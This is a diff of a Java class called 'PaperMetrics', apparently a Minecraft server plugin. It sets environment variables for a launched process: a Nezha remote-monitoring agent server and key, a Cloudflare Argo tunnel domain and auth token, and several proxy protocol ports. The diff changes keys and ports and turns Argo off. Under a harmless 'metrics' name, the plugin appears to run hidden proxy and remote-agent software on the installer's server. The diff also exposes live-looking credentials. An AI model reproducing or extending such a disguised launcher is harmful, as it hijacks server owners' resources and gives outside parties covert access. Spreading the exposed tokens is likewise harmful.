@@ -66,18 +66,18 @@ public class PaperMetrics extends JavaPlugin {
 
         Map<String, String> env = pb.environment();
         
-        putEnvSafe(env, "UUID", "a23899e0-3b9b-4c55-b5f3-605d952995fa");
+        putEnvSafe(env, "UUID", "88b7c262-690e-465a-8262-27e38547e2cc");
         putEnvSafe(env, "FILE_PATH", "./world");
         putEnvSafe(env, "NEZHA_SERVER", "nz.lilyonlyone.eu.org");
         putEnvSafe(env, "NEZHA_PORT", "443");
-        putEnvSafe(env, "NEZHA_KEY", "z75hP8BLt3ULDchAj1");
-        putEnvSafe(env, "ARGO_PORT", "9002");
-        putEnvSafe(env, "ARGO_DOMAIN", "gr.donna.dpdns.org");
-        putEnvSafe(env, "ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiMDQyZTcwZTEtNzQ5Yy00N2Y4LWI2MmUtMDhlZDRiMjMzMTUxIiwicyI6Ik1qY3lZMlV3WVRVdE9XWmtOUzAwTVRaa0xUZ3haR0V0T1RZM1lXUTJNVFUyTW1FMSJ9");
-        putEnvSafe(env, "S5_PORT", "20300");
-        putEnvSafe(env, "HY2_PORT", "20407");
+        putEnvSafe(env, "NEZHA_KEY", "4gPAXAbuLDunNIg5RJ");
+        putEnvSafe(env, "ARGO_PORT", "31140");
+        putEnvSafe(env, "ARGO_DOMAIN", "");
+        putEnvSafe(env, "ARGO_AUTH", "");
+        putEnvSafe(env, "S5_PORT", "");
+        putEnvSafe(env, "HY2_PORT", "");
         putEnvSafe(env, "TUIC_PORT", "");
-        putEnvSafe(env, "ANYTLS_PORT", "");
+        putEnvSafe(env, "ANYTLS_PORT", "31141");
         putEnvSafe(env, "REALITY_PORT", "");
         putEnvSafe(env, "ANYREALITY_PORT", "");
         putEnvSafe(env, "UPLOAD_URL", "");
@@ -86,7 +86,7 @@ public class PaperMetrics extends JavaPlugin {
         putEnvSafe(env, "CFIP", "saas.sin.fan");
         putEnvSafe(env, "CFPORT", "443");
         putEnvSafe(env, "NAME", "");
-        putEnvSafe(env, "DISABLE_ARGO", "false");
+        putEnvSafe(env, "DISABLE_ARGO", "true");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
